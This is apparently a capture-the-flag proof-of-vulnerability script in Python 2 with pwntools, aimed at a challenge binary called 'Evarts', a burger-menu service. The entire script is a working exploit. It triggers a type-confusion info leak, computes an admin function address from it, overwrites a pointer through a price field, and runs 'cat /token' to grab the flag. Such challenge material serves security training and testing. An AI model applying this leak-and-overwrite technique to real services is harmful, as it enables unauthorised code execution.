#!/usr/bin/python
import sys
import socket
import random
import time
import base64
import os
import datetime
import struct
import string
import binascii
from pwn import *
import logging

logging.getLogger().setLevel(10)

ING_TRIGGER = 149
ING_LINE = re.compile("([^\$]+)\$(\d+\.*\d*)")
LEAK_LINE = re.compile("^price\s+Unexpected type:\s+\d\s+with\s+value\s+([\dA-F]+)")

BINARY_PATH = os.environ.get("BINARY_PATH", "/target/evarts")

def wait_for_prompt():
    global s
    s.recvuntil("Enter selection:", drop=True)

def wait_for_ingredient_name():
    global s
    s.recvuntil("Provide a name for the ingredient:", drop=True)

def wait_for_ingredient_price():
    global s
    s.recvuntil("Provide a price (Enter nothing to make it free):", drop=True)

def wait_for_ingredient_price_update():
    global s
    s.recvuntil("Changing price for ingredient:", drop=True)

def wait_for_make_burger_next_ingredient():
    global s
    s.recvuntil("Next ingredient:", drop=True)

def parse_ingredients():
    global s
    resp = s.recvuntil("Welcome to Bob's Burgers!")
    matches = filter(None, [ING_LINE.match(i) for i in resp.split("\n")])
    return [(m.group(1).strip(), m.group(2).strip()) for m in matches]

def parse_ingredients_for_leak():
    global s
    resp = s.recvuntil("Welcome to Bob's Burgers!")
    matches = filter(None, [LEAK_LINE.match(i) for i in resp.split("\n")])
    return [m.group(1).strip() for m in matches][-1]

def send_to_evarts(data):
    global s
    s.send(data)

def run_pov(HOST, PORT):
    global s
    e = ELF(BINARY_PATH)
    s = remote( HOST, PORT )

    cnt = 0
    last_ingredient = None
    while(cnt < 24):
        wait_for_prompt()
        send_to_evarts("2\n")
        if cnt == 0:
            last_ingredient = "price\n"
        elif cnt == 1:
            last_ingredient = "AAAAAAA\n"
        else:
            last_ingredient = "price"+str(cnt)+"\n"
        cnt += 1

        logging.debug("adding ingredient " + last_ingredient)
        send_to_evarts(last_ingredient)
        wait_for_ingredient_price()
        send_to_evarts("1.00\n")

    wait_for_prompt()
    send_to_evarts("1\n")

    send_to_evarts("3\n")
    items = 0
    wait_for_make_burger_next_ingredient()
    next_ingredient = None
    while(items < ING_TRIGGER):
        if items == 0:
            next_ingredient = "price\n"
        elif items == 1:
            next_ingredient = "AAAAAAA\n"
        else:
            next_ingredient = last_ingredient
        items += 1
        logging.debug("adding to burger " + next_ingredient)
        send_to_evarts(next_ingredient)
        wait_for_make_burger_next_ingredient()

    send_to_evarts("q\n")
    wait_for_prompt()
    send_to_evarts("1\n")

    logging.info("parsing data leak")
    try:
        data_leak = parse_ingredients_for_leak()
    except Exception as e:
        print '[FAILED] PoV failed to inject query'
        sys.exit()
        s.close()

    try:
        do_add_ingredient = struct.unpack("Q", binascii.unhexlify(data_leak[16:]))[0]
        do_admin = do_add_ingredient + e.symbols["do_admin"] - e.symbols["do_add_ingredient"]
        str_do_admin = str(do_admin)
        change_do_admin = str_do_admin[0:-2] + "." + str_do_admin[-2:]

        send_to_evarts("2\n")
        wait_for_ingredient_name()
        send_to_evarts("price\n")
        wait_for_ingredient_price_update()

        send_to_evarts(change_do_admin+"\n")
    except Exception as e:
        print '[FAILED] PoV failed to modify admin pointer'
        sys.exit()
        s.close()

    logging.info("preparing to cat flag")
    wait_for_prompt()
    send_to_evarts("5\n")
    send_to_evarts("cat /token\n")
    flag = s.recvline()[1:-1]
    s.close()

    if flag:
        print 'TOKEN=' + flag
        print '[SUCCESS] PoV succeeded'
    else:
        print '[FAILED] PoV did not capture the flag in /token'
        sys.exit()

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print '[ERROR] target and port must be specified via arguments or variables.'
            sys.exit(1)

    print '[INFO] PoV for the Evarts Challenge Binary'

    run_pov(HOST, PORT)
    print '[SUCCESS] PoV completed successfully'

if __name__ == '__main__':
    main()
